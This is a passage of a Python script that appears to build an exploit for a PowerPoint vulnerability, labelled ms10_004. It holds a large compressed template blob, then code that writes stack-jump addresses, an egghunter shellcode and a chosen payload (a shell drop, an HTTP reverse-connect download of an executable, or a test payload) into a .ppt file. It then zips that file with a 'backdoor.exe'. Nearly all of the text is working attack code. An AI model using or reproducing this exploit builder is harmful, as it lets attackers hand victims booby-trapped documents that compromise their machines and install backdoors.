b"\xF2\xF9\xD5\x55\x35\x55\x0E\x06\x99\x0C\x9D\x07\x54\x50\xD3\x3D"
b"\xDB\x99\x98\xD8\x4E\x0E\x19\x49\xD9\x5E\xB5\x70\xC2\x3D\x94\xD3"
b"\xB6\x49\xFF\x85\x34\xD8\x65\xBD\x2E\xDA\xFC\x62\x06\x56\x84\x16"
b"\x06\xF8\x91\x07\xF5\xF4\xB4\x2B\x68\xEB\x81\x11\x74\xF7\x20\x2C"
b"\x2C\x27\x61\x13\x30\x3C\xFC\xF9\xA9\x93\x27\x5A\xC6\xF3\x1F\xFD"
b"\xC9\x8C\x3D\xE1\x97\xA1\xE7\x61\xC1\x3B\xEF\x4A\xED\xF1\x0A\x57"
b"\xCC\x9B\xF0\x82\x5F\xBB\x32\xAE\xF9\x8B\x58\xEA\x26\xE0\x2D\x17"
b"\x4C\x9D\x4C\x57\xD3\x3D\x39\xA9\x23\xF0\xAC\xB6\x01\x5B\xE3\x71"
b"\x3B\x9E\x9A\xED\xAD\xF8\xF0\xF7\x98\xCD\xDE\x09\x79\x4D\xC3\x6D"
b"\xDE\x6D\xD5\x99\x45\x9D\xD9\xA8\x33\x3B\xCD\xCD\xCD\xD0\xBC\xA3"
b"\x19\x1E\x79\x25\x0E\x5E\xAF\x17\xFC\x7E\x3F\x04\x02\x01\xEC\xB2"
b"\xF7\x87\x41\x83\x06\xC1\x90\x21\x43\x60\xF8\xF0\xE1\x70\xF2\xC9"
b"\x27\xC3\xEC\xD9\xB3\x61\xEA\xD4\xA9\x24\x36\x30\x66\xCC\x18\x50"
b"\x37\xD6\xF1\x30\xA6\xED\xD8\x81\x8F\xED\x51\xF0\xCE\xF6\x97\x60"
b"\xF7\xEE\xED\x50\xFF\xD8\x2A\x88\x50\xF9\xE7\x41\x48\xBA\xE4\xD0"
b"\x81\x08\xD2\xA1\xE1\x56\x48\x1A\xB6\xA4\xCC\x45\x11\x87\x86\x0D"
b"\xE9\x61\x58\x31\xA4\x32\x37\x52\x15\x76\x74\x35\x86\x18\x52\x99"
b"\xC0\x22\x31\x3D\xCA\x8A\xEA\x76\x0C\xA9\x68\x1F\x6B\x42\x14\x19"
b"\x53\x3A\x32\xFA\x73\x90\x51\x64\x0C\xA9\x8C\x01\x11\xA4\x83\x8C"
b"\x22\x63\x48\x65\x8C\x8A\x20\x1D\x64\x14\x19\x43\x2A\x63\x68\x04"
b"\xE9\x20\xA3\xC8\x18\x52\x19\xE3\x23\x48\x07\x19\x45\xC6\x90\x8A"
b"\x8E\x61\x82\x1C\x64\x14\x19\x43\x2A\x93\x40\xB2\x84\xFE\xA2\xC8"
b"\x18\x52\x99\x44\x47\x90\x0E\x32\x4A\x43\xB4\x90\xCA\x38\x22\x82"
b"\x74\x90\x51\x64\xCC\x38\x26\x82\x74\x90\x51\x1A\xB2\x86\x54\xC6"
b"\x59\x11\x64\x14\x19\x43\x2A\xE3\xBC\x08\x32\xAA\x68\xD8\x17\xC5"
b"\x15\xC3\x3F\xA5\xB5\x10\x1D\x4A\x7F\x31\xCE\x95\x28\x6B\x24\x59"
b"\x15\xC3\xB5\x02\xED\x6C\x1A\x06\xE6\xD0\x75\xB8\x8E\xD1\x50\x2E"
b"\xDC\x8E\xE0\xBD\x0E\xDD\x8F\x8C\x21\x95\xC9\x90\x08\xD2\xE1\xF8"
b"\xF1\x38\x52\x99\x4C\x8A\x28\x3A\x8E\xD7\xE3\x3A\xA6\xA2\x7A\x38"
b"\x1B\xE7\x82\xF6\x40\x94\x6D\x8A\x71\x06\xD3\xB0\x3A\x07\x19\x45"
b"\xC6\x90\xCA\x64\x2E\x0D\x57\xA3\xA1\x64\x51\x5C\xC7\x90\x8A\x0B"
b"\x02\x1E\x47\x3A\xC8\x28\x32\x86\x54\xA6\x10\xD0\x90\x3A\x07\x19"
b"\x45\xC6\x68\x78\x9D\x29\x18\x11\xA4\xA3\xC8\x16\x3C\x8E\x54\x74"
b"\xCC\xE4\x02\xA5\x9A\x0A\x53\x24\x82\x39\x82\x8C\x22\x63\x48\x15"
b"\x51\x5C\xA0\x22\x48\x07\xE3\x8E\xE2\x3A\x86\x54\x5C\xE8\xF0\x38"
b"\xD2\x41\x46\x91\x31\xA4\x32\x05\x2F\x82\xA4\x61\x73\x89\x21\x83"
b"\x8A\x8E\x61\xDB\xE4\x60\x9C\x51\x5C\xD3\x30\x3C\x45\x79\x4B\xF9"
b"\xA2\x1C\x1E\x16\xA7\x28\x0E\x3C\xFE\x30\x0C\x83\xB9\x73\xE7\xF2"
b"\xF0\xBA\xE5\xCB\x97\xF3\xB0\xC2\xCD\x9B\x37\xC3\xD3\x4F\x3F\x0D"
b"\xBF\xFD\xED\x6F\xA1\xA5\xA5\x05\x76\xED\xDA\x05\x6F\xBF\xFD\x36"
b"\xEC\xDD\xBB\x17\xF6\xEF\xDF\x0F\xEA\xC3\x38\xAC\x5D\xBB\x8E\xDB"
b"\x3D\x65\x06\x94\x29\xB3\xA1\xCC\x0E\xB5\x8D\xA3\x8C\x52\x93\x10"
b"\x0C\x34\xDB\xA4\x4F\x53\xA9\x45\x98\x76\x10\x4D\xC2\xFD\x2D\x1E"
b"\x92\xB1\x98\x7B\x10\xF0\xB8\x4C\xDB\x89\x36\x98\x34\x6E\x24\x6A"
b"\xCF\x1A\x92\xE9\x4B\x00\xD6\x9A\x16\x86\x5E\xB0\x25\xB6\x2D\x30"
b"\x5D\x90\x4B\xB2\xB5\x6B\x75\x5A\xB0\xEA\xEA\xF4\x8A\xFE\x70\x23"
b"\xA1\x55\xF1\x57\x1E\xE9\xB4\x56\xD5\xDD\xA8\x60\xFA\x74\x85\x4A"
b"\xB5\x1D\xD4\x9E\x18\xBC\xB4\xFD\x1D\xD8\xBE\x7B\x37\xAC\x7A\xAC"
b"\x5E\x8B\x93\x5B\xAD\x68\x97\x74\x81\xEA\x23\x89\x10\x95\x49\x2E"
b"\x13\xA0\x05\x8C\xEA\x24\x95\x47\x27\x21\x3C\xA0\x45\x8D\xEA\x64"
b"\x54\x97\x53\x2D\x46\xA0\x85\x8E\xEA\x25\xD5\x0D\x2A\x93\x24\x50"
b"\x24\x70\x54\x27\xB8\x2C\x66\x51\x2B\x96\xAB\x08\x6B\x44\xC4\xD4"
b"\x13\x2A\xA7\x6C\x12\xEB\x95\xC3\x75\x35\xC2\x75\x45\x69\x33\x59"
b"\xAF\x1C\xAE\xAF\x11\xAE\x2B\x4A\x9B\xCE\x7A\xE5\x70\x7D\x8D\x70"
b"\x5D\x51\xAC\x55\x11\xD6\x8A\x28\xD7\x11\x2E\xA7\xD9\xD4\x8A\x25"
b"\x32\xC2\x5A\x45\xDA\xE0\x70\x9D\x55\xDA\x0D\xAC\x9B\x0E\xD7\x55"
b"\xAA\x2B\xEC\x16\xD6\x4C\x87\x35\xC3\xE1\xFA\xAA\xB4\xAB\x58\x33"
b"\xA3\x5C\x4F\xA9\x9E\x38\x5C\xCD\x22\x5C\x3F\xA9\x8E\xC4\xB8\xD4"
b"\xC6\xB4\x0B\x8D\x56\x25\xD5\x2A\xA2\xD5\x83\x74\x82\xD5\x8A\x65"
b"\x31\xC2\xDA\x19\x35\x3A\x41\xF5\x37\xCA\x5A\xED\xB0\x56\x45\x59"
b"\x27\x94\xCE\x0E\x8E\x5B\x6B\x55\x94\x75\x42\x71\x16\x91\x56\x93"
b"\x7E\x46\x8D\x46\x70\x3D\xD5\xEA\xC8\xA9\x4F\xA8\x95\x96\xFD\x08"
b"\xEB\x34\xE9\x65\x8C\xF5\x4A\xE9\xAC\xE5\x76\xC3\x61\xBD\x8C\x25"
b"\xF4\x82\x25\x32\xC2\x5A\x1D\x63\xDD\x8C\xB1\x56\x70\x11\xE0\x36"
b"\xC3\x61\xCD\x8C\xB1\x5E\x29\x2E\x16\x31\x6E\x3B\x1C\xD6\xCC\x18"
b"\xEB\x95\x32\xA5\x41\xAB\x95\x6E\x33\x23\xDC\x4E\x90\x2E\x2B\xD6"
b"\x4B\xA5\x8B\x13\xB7\x5B\x0E\xEB\xA4\x62\xCD\x54\xBA\x88\x71\x9B"
b"\xE5\xB0\x66\x2B\xD6\x4B\xC5\xED\xA5\xE2\x36\xCB\x61\xCD\x56\xAC"
b"\x97\x8A\xDB\x2B\x6E\x33\x58\xB3\x63\xAC\x4F\xA4\x55\x8E\xD1\x2D"
b"\xD2\x2A\xD2\xAD\x61\xA8\x56\x9D\xD5\xAA\xF8\x87\x0A\xD6\xAD\x5D"
b"\x6B\xFA\xE8\x7A\x48\x33\xEB\x53\x42\xAD\x94\xD6\x10\xF9\x9F\x2E"
b"\x81\x40\x20\x10\x08\x04\xBD\x8B\xA6\xD6\x86\xBB\xEE\x6A\xB8\xB3"
b"\x01\x69\xD6\x4F\x36\xF5\x25\xFB\x5A\x5B\x9A\xEE\x6A\x68\xFF\xD7"
b"\xA7\xEC\x6B\x6A\x69\x40\xCF\xDD\xA9\xBD\xC7\xEB\x3B\xFB\x98\xFF"
b"\x5A\xFA\xB6\xFF\x74\xF9\x73\x97\xC1\x3E\x65\x9F\xEA\xEB\xFE\x6B"
b"\x69\xB8\xCB\x94\x3B\x29\x7F\xA2\x7F\xA2\x7F\xA2\x7F\xA2\x7F\x52"
b"\xFE\x44\xFF\x44\xFF\x44\xFF\x44\xFF\x8E\x20\x32\x8F\x15\xD0\x48"
b"\x8E\x15\x28\xD1\x63\x05\x44\x2B\x45\x2B\x45\x2B\x3F\xF9\x5A\xD9"
b"\xB7\xCB\x5F\x63\x4B\x53\x4B\x23\xFD\x35\x35\x26\xD7\x4D\x2D\x2D"
b"\xAD\x4D\x2D\x4D\xAA\x49\xB5\x18\x26\xB6\x8F\x40\xFE\x36\xB6\xB6"
b"\xB4\xB6\x28\x37\x77\xEC\x68\x68\x69\xDC\xD1\xD0\xD4\xE4\x36\xAE"
b"\x55\xAF\x7B\x1D\x0D\x8D\x0D\x1A\x8D\xED\xD8\xA8\xD7\x1B\x37\xD2"
b"\x16\x7A\x14\xD1\xD8\xD4\xD4\x72\x24\x9A\xEA\xD6\xA6\x56\x34\x80"
b"\x96\xAD\xB4\x6C\x69\x8D\xB6\xEE\xC0\x5A\x4D\x47\x1B\x5B\x36\xB6"
b"\x50\x46\x63\x35\x27\x57\x1F\x89\xF2\x87\xFE\xD9\x41\x7F\x8D\xB4"
b"\x6E\xA1\xBF\x46\x5A\x36\x36\xEA\xAD\x46\x5D\x2A\xA9\x3C\x62\xD6"
b"\x1F\x01\xFF\xED\xD8\xB8\x7D\xE3\x8E\x8D\x0D\x9A\x0D\xDB\x37\x6E"
b"\xD7\xE6\xE2\xB6\x31\x7C\x47\x8B\xEB\xAF\xF7\xED\xAB\xDF\x56\xBF"
b"\xB5\x7E\xDB\xFA\xD7\xF4\xBA\xFE\xB5\x57\x5F\x5B\x9F\xE4\x7A\xD7"
b"\x5A\xFF\xF5\xBE\x7D\xDB\x9E\xD9\x8A\x86\xBD\xB6\x9E\x96\xB4\x7E"
b"\xED\xD5\x57\x5F\x45\xA6\xAE\x0D\x95\x40\xD0\x6D\x64\x1A\x4B\x76"
b"\xD0\x13\x59\x6F\x38\x3C\xE6\xB5\xB6\xA9\x71\x72\xCD\xC3\x5E\xB2"
b"\x1C\xE7\x3B\x52\x8E\xB7\x1E\x3E\x03\xA1\xB1\x15\x7B\x01\x29\x64"
b"\xFB\x32\x1C\x6F\x84\xEC\xC7\x0F\xA3\xFF\x1A\x53\x69\xFC\x97\x76"
b"\x9C\xFC\x94\xED\xF8\x61\xF3\x5F\x4B\x63\x6B\x2A\xD9\xBE\x0C\xC7"
b"\xD9\x7F\x59\x8E\x1F\x36\xFF\xA5\x96\xA5\x46\x53\xFE\x32\x1C\x67"
b"\xFF\x65\x39\x2E\xE5\xAF\x8F\x96\xBF\x56\x53\x86\x5C\x6B\xE3\xBF"
b"\xB4\xE3\xC6\x7F\x19\x8F\xF7\x05\xFD\x33\xFE\x13\xFD\x13\xFD\x3B"
b"\x5A\xF4\x2F\x53\x79\x32\xDD\x94\xF4\xE3\xE6\x44\x7A\x79\x3D\x9C"
b"\x63\x68\xB3\xF6\x96\xB2\xF6\xA2\x7A\xB1\x7B\xE5\xB6\xB3\xE7\x4E"
b"\xF4\x5E\x4F\xF5\xE0\x38\x8C\xA6\xF4\x84\x63\x0F\x9F\x75\x58\xE3"
b"\xA0\xCF\xDA\x07\x9D\xD4\x2C\xE8\x65\xE7\x25\x74\xAB\xA3\x2E\xEC"
b"\x55\xFB\x20\xB5\x9D\xED\x4C\x75\xE9\x9D\x3A\x9A\x68\x33\x0F\x1E"
b"\x23\x64\x69\x97\x7B\xC5\x83\x1D\x28\x7F\xBD\xDC\xCF\x4B\xEF\xB1"
b"\x1C\xCA\xBE\xDE\xED\xE7\xB9\xFD\xD7\xA1\x3E\x5B\x2F\xF7\xF3\x52"
b"\x7B\x2C\x8D\x1D\xF0\x5F\x6F\xF6\xF3\x3A\x5F\xFE\x7A\xB7\x9F\x97"
b"\xFA\xC4\x71\xE8\xF2\xD7\xCB\xFD\x3C\x29\x7F\xA2\x7F\xD9\xF5\xEF"
b"\xEC\x80\x1E\x2B\x70\x75\x49\xE6\xB1\x02\x34\x4E\x80\x40\x63\x05"
b"\x44\x2B\x8F\x06\xAD\xEC\x9D\xBE\x44\x07\xCB\xD2\x11\xE9\x8B\x75"
b"\xBC\xFC\x1D\x19\xB8\xFA\x8A\x4D\xBD\xE6\x91\xAE\xBE\x1B\x04\xE8"
b"\x93\x1E\x4C\x68\x60\x5F\xFD\x27\x60\x38\xFC\xEF\x57\x3A\xFD\x24"
b"\xDE\x6E\xE9\x7A\x56\xEE\xC8\xB2\x17\x0C\x84\x94\xA5\xFE\x6F\xEF"
b"\xF4\xE3\xA9\xCB\x5E\x7B\x05\xD3\xC5\xE5\x91\xF2\x5F\x47\x97\xBD"
b"\x64\x60\xD7\x4D\x14\xFB\x3A\x58\x49\x8F\x50\xE5\x15\x7C\x72\x01"
b"\xBD\xB1\x34\xDF\x1F\xBA\x54\x52\xA1\x9B\x95\xB3\x43\xCB\x6E\xC8"
b"\x64\x77\x5A\x86\x0E\x2F\xBB\xD1\xCC\xF4\x75\xFF\x1D\x7E\xE3\x14"
b"\x74\x4B\xC6\xFB\xBA\x7D\xBD\x54\x85\xA5\x99\x11\x08\x8E\x0A\xD0"
b"\xF4\xE0\xC5\xE6\x37\x36\x43\xEE\x9F\xF3\x96\x39\x41\x65\x4E\x50"
b"\x99\x13\xF4\xA8\x9B\x13\x94\xB4\x80\xE4\xC0\xB6\xFC\x3C\xA5\x70"
b"\x81\xC7\xFC\x7E\x34\x04\x3C\x5B\x3C\xCD\x76\x1E\xEE\xBF\x87\xA7"
b"\x3D\x32\x7B\xB0\x28\x85\x28\xC5\x51\xAC\x14\x89\xE7\x61\x52\x8B"
b"\xB3\x3D\x7A\x9D\x6B\xD9\x3C\x07\xFA\x84\x02\x9A\x1B\xF8\x06\x9E"
b"\xD9\x97\xE6\x0A\x6E\xE6\x7F\x65\x96\xB9\x7E\x65\xAE\x5F\x99\xEB"
b"\x57\xE6\xFA\x95\xB9\x7E\x05\x02\x81\x40\x20\x10\xF4\x2D\xC8\xFC"
b"\x45\xDD\xF4\x9F\xCC\x5F\xD4\x13\xE5\x4F\xE6\x7A\xEB\x7A\xF9\x93"
b"\xB9\x2E\x45\xFF\x44\xFF\x44\xFF\x44\xFF\xA4\xFC\x89\xFE\x89\xFE"
b"\x89\xFE\x89\xFE\x49\xF9\x13\xFD\x13\xFD\x13\xFD\xEB\x01\xFD\x93"
b"\xF9\x7B\xBB\x95\xBF\x32\x7F\x6F\x37\x9B\x5F\x99\xBF\xB7\x3B\x90"
b"\xF9\x7B\xBB\x07\x99\xBF\x57\xD0\xDB\x90\xF9\x7B\xBB\x67\x9F\xCC"
b"\x5F\xD9\x4D\xFF\xC9\xFC\x95\x52\xFE\x64\xFE\xDE\x1E\xD1\x3F\x99"
b"\xBF\x57\xF4\xEF\x28\xD3\x3F\x99\xBF\xB7\xC7\xEC\xEC\xB9\x13\xBD"
b"\xD7\x53\x95\xF9\x7B\x33\x5A\x27\xF3\xF7\x76\xC3\x79\x32\x7F\x6F"
b"\xF7\xEA\xA8\xCC\xDF\xDB\x23\x3D\x16\x99\xBF\xB7\x3B\x3D\x16\x99"
b"\xBF\xB7\x7B\x4F\x1C\x32\x7F\xEF\xD1\x5E\xFE\x44\xFF\xA4\xFC\xF5"
b"\x31\xFD\x93\x39\x79\x95\xCC\xC9\xDB\x73\xEF\xFB\x64\x4E\xDE\xAE"
b"\x59\x28\x73\xF2\x76\xD6\x40\x99\x93\xB7\x67\xFD\x27\x73\xF2\xFE"
b"\x13\xD9\x27\x73\xF2\x0A\xFA\x5A\xB1\x92\x39\x79\x95\xCC\xC9\x2B"
b"\x73\xF2\x2A\x99\x93\x57\x9A\x19\x81\xE0\x9F\x05\x36\x74\x17\x07"
b"\xB0\x49\xF0\x59\x9E\xB4\xE3\x74\xC4\xB3\xED\xD5\x6D\xF7\x9E\x71"
b"\x6C\x68\xF5\xF7\xFC\x70\xEA\x69\xEF\x3F\x39\x89\xE6\xF7\x4C\x39"
b"\xF6\x91\x05\xF0\x13\x33\x23\x30\x4D\xF4\x79\xAB\xF9\x85\xB1\x55"
b"\xC8\x20\xF2\x51\x33\xEF\xDF\x46\x64\x0E\x3D\xCA\xD2\xDC\x7F\xC8"
b"\x5F\x20\xFD\x66\x6E\xCE\x3C\xE4\x56\x64\x3E\x72\x07\xF2\x53\xC8"
b"\x3F\xD2\x8C\xA2\xC8\x3D\xA0\xC3\xDE\x87\x2C\x42\x7E\x84\x1C\x44"
b"\x61\x62\x64\x85\x34\xD7\x28\xAE\x03\xB8\xFE\xBC\xA5\x6D\xFE\x23"
b"\x46\x36\xD4\xDC\x33\xAD\xF2\xF4\x9A\xF9\xD5\x65\x65\x95\xE1\x99"
b"\x8B\xAA\x96\xE8\xE3\x5E\xD7\xAF\xA0\x3D\xBF\x4C\xAF\x73\xCD\xBE"
b"\x95\xB2\x86\x94\x75\x70\x44\x01\xDB\x04\xC6\xB6\x4C\xEB\xA1\x21"
b"\x7D\x2D\xA5\x75\x42\x75\xF9\xBC\x0A\xF6\xC2\xA4\x32\x67\xDE\xF5"
b"\x15\xB5\xE1\x49\x65\x35\xE5\x0B\x2B\x61\x38\x9D\x3C\x14\x20\x10"
b"\xD2\xC1\x0C\x35\xC1\x4F\xAE\xAA\xAC\xAD\x09\xCF\xAE\x29\x5B\x90"
b"\xB4\x32\x91\x52\x1D\x6E\x78\x56\xD9\xB5\x8B\x2B\xE6\xD5\x96\xB5"
b"\x3B\x4F\x5E\x9A\x59\x51\xBE\xA0\x2C\x3C\xAB\xBC\xB6\xA2\xAC\x26"
b"\x79\x12\x26\xB9\xD2\x17\x36\x07\xCF\x36\x79\x7F\x9E\xD9\xF7\x98"
b"\x7C\xBA\xA2\xAC\xBA\xA6\xBC\xAA\x32\xE9\x63\xDB\xF5\x8B\x72\x02"
b"\x81\x40\x20\x10\x08\x04\x02\x81\x40\x20\xF8\x24\xE0\x1F\xC1\xE3"
b"\x71\x59\x8C\x9C\xDB\x7C\xE7\xAE\x95\x23\xE8\x79\x78\x9F\x4D\xCF"
b"\x77\x97\x95\xCF\xAF\xAA\x98\x57\x43\x8F\x7F\x97\x41\x39\xCC\x87"
b"\x2A\xA8\x80\x79\x50\x23\x3E\x13\x08\x04\x02\x81\x40\x20\x10\x08"
b"\x04\x02\x81\xE0\x93\x85\xC4\x37\x5E\x7A\xDE\xA7\x6F\xE3\xF4\xFB"
b"\x9D\xF4\xD1\x99\xBE\x89\xD3\x83\x3F\x7D\x9B\xA7\xEF\xF2\xF4\x01"
b"\x9A\xBE\xB3\xD3\xD7\x64\xFA\x25\x60\xFA\xAA\x4D\x5F\x9E\xFB\x23"
b"\x07\x80\xFE\x36\x4F\xEF\x10\x06\x82\xFE\x3E\x4F\xDF\xF0\x4B\x90"
b"\xC7\x20\x07\x23\x8F\x45\x0E\x41\x1E\x07\xFA\xAB\x34\xBD\x73\x08"
b"\x23\x87\x21\xE9\x73\xF8\xA7\x91\x27\x20\x4F\x44\x9E\x84\x1C\x01"
b"\xFA\x57\x00\x4F\x46\x9E\x82\x3C\x15\x79\x1A\xF2\x74\xE4\x19\x40"
b"\xE3\x16\x94\x1A\x85\xEB\xD1\xC8\xB3\x40\xFF\x08\x1F\x7D\xBB\xFE"
b"\x17\xE4\x39\xC8\xCF\x20\xCF\x45\x8E\x41\xFE\x2B\xF2\xB3\xA0\xBF"
b"\x69\x7F\x0E\x39\x16\x39\x0E\x39\x1E\x39\x01\x79\xBE\x09\x8F\xBE"
b"\x87\x5F\x80\x9C\x8C\xBC\x10\x79\x11\x72\x0A\xF2\x62\xD0\x3F\x3E"
b"\x78\x29\x72\x2A\xD0\xCB\x10\x80\x69\xC8\xE9\xC8\xCB\x91\x33\x90"
b"\x33\x91\xB3\x90\xB3\x91\x57\x20\x3F\x8F\xBC\x12\xF9\x05\xE4\x55"
b"\xC8\x7F\x43\xCE\x41\x7E\x11\x79\x35\x72\x2E\xB2\x14\x39\x0F\x79"
b"\x0D\x72\x3E\x72\x01\xB2\x0C\xF4\x0F\x07\x2E\x44\x2E\x42\x96\x23"
b"\xBF\x84\xFC\x32\xB2\x02\x79\x2D\xB2\x12\x59\x85\x5C\x8C\xBC\x0E"
b"\x59\x8D\xA4\x97\x32\xB5\xC8\xEB\x91\x5F\x41\x2E\x01\xFD\xEB\x89"
b"\x5F\x45\x7E\x0D\xF9\x75\xE4\x8D\xC8\x6F\x20\xFF\x1D\xB9\x14\xF4"
b"\x8F\x26\xDE\x84\xBC\x19\xB9\x0C\xF9\x4D\xE4\x2D\xC8\xE5\xC8\x6F"
b"\x81\x1E\xCB\xB1\x02\xB9\x12\xF9\x6D\xE4\x6D\xC8\xDB\x91\xDF\x41"
b"\xDE\x01\x7A\x8C\xC7\x9D\xC8\xBB\x90\xAB\x91\x6B\x90\xDF\x45\xDE"
b"\x8D\xFC\x1E\xF2\x1E\xD0\x3F\x76\x48\xBE\xFD\x01\xAE\xEF\x45\xFE"
b"\x07\xF2\x3E\xE4\xFD\xA0\x7F\xE1\xF1\x01\x73\xFE\x21\x5C\xAF\x43"
b"\x3E\x8C\x7C\x04\xF9\x43\xD0\x63\x47\x1E\x33\xE7\x3F\x36\xAC\x37"
b"\xFB\x82\x9E\xC1\x0C\x2C\x49\x55\x58\x72\xC2\x58\xF2\x2B\x71\x5D"
b"\xCD\x25\xA6\xE3\x18\x04\x3E\xCB\x3D\x1A\x29\x74\xFB\x4D\x0B\x7E"
b"\x30\xED\xD7\xFD\x97\xBF\x0D\x8F\xC3\x4F\x4F\xFE\x73\xA6\x7B\x0E"
b"\xB8\xFE\xDD\x6C\x3A\xBF\x58\xAC\xC5\x72\x5B\x8D\x65\xBF\xF3\xAF"
b"\x16\x07\x80\xC7\x3A\xC4\xBF\xB1\x65\x44\xF1\x1C\xBD\x9E\xC8\x31"
b"\x53\xDC\x95\xEC\x85\xD9\x68\x43\x19\xD7\xA8\x8E\x61\x30\xC6\x4F"
b"\x1A\xDA\x99\xF8\x1F\x04\x48\xFE\x84\xBA\x0F\x95\xE3\x7A\xAC\xD5"
b"\xD7\xA2\x12\x90\xEF\xA7\xA0\x1D\x0E\xE6\x48\x35\x1F\xA9\x45\xEF"
b"\x54\x71\x7D\xCF\x86\x91\x18\xBF\xC7\xE8\x76\x47\xE3\x9F\x88\xFC"
b"\x45\x7D\xC2\xFF\x55\xA8\x15\x94\x62\xDA\x2A\x37\x5E\x98\x84\xDB"
b"\xF3\xD9\x2E\xED\x97\x83\xC7\xDF\x59\xFF\x9F\x89\x7C\x72\x44\x22"
b"\xFD\xA9\x71\x75\xCE\x1F\xE7\x62\xFC\xDE\x4E\xFA\xFF\xFB\x2E\xFF"
b"\xF7\x04\xBA\x52\xFE\x7A\x12\xDD\x89\xFF\xFF\x01\x45\x16\x96\xA9"
b""
)
		self.dest_ppt = outputFile
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(self.compressedfile))
		#input = bytearray(self.compressedfile)
		
		egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xb8\x41\x90\x41\x90\x89\xd7\xaf\x75\xe8\xaf\x75"
b"\xe5\xff\xe7"
)

		#secondstage = 
		shellcode = self.createShellcode()
		
		offset = 0x84F6
		
		for i in range(0,4):
			input[offset + i] = b"\x00\x35\x13\x00"[i]                      #jump in the stack

		offset = 0x6AE4    
		for i in range(0,4):
			input[offset + i] = b"\x08\x35\x13\x00"[i]                      #jump in the stack
	
		for i in range(0,len(egghunter)):
			input[offset + 4 + i] = egghunter[i]

		offset = 0x1000
		
		for i in range(0,500):
			input[offset + i] = b"\x41\x90"[i%2]                            #egg hunted
		
		for i in range(0,len(shellcode)):
			input[offset + 500 + i] = shellcode[i]

		tmp_bkname = os.path.split(self.dest_ppt)[1]
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_doc = os.tempnam()
			tmp_backdoor = os.tempnam()
			
		f = open(tmp_doc,mode='wb')
		f.write(input)
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding ppt file"
		zip.write(tmp_doc, "document.ppt")
		print "Adding backdoor"
		zip.write(self.dest_ppt, "backdoor.exe")
		
		zip.close()
		
		try:
			os.unlink(tmp_doc)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1

		
		return

	def run(self):
		self.make_doc()
		return 1

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 4:
		print "[ERROR] %s require 4 parameters"%(DESCRIPTION)
		print "[-INFO] backdoor output zip [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 3:
		for i in range(3, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)

	if os.path.isfile(sys.argv[3]) == False:
		print "[ERROR] File %s doesn't exists."%(sys.argv[3])
		sys.exit(0)
		
	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=ms10_004(sys.argv[1], sys.argv[2], sys.argv[3], dbg)
	app.run()
	
	print ' ... done'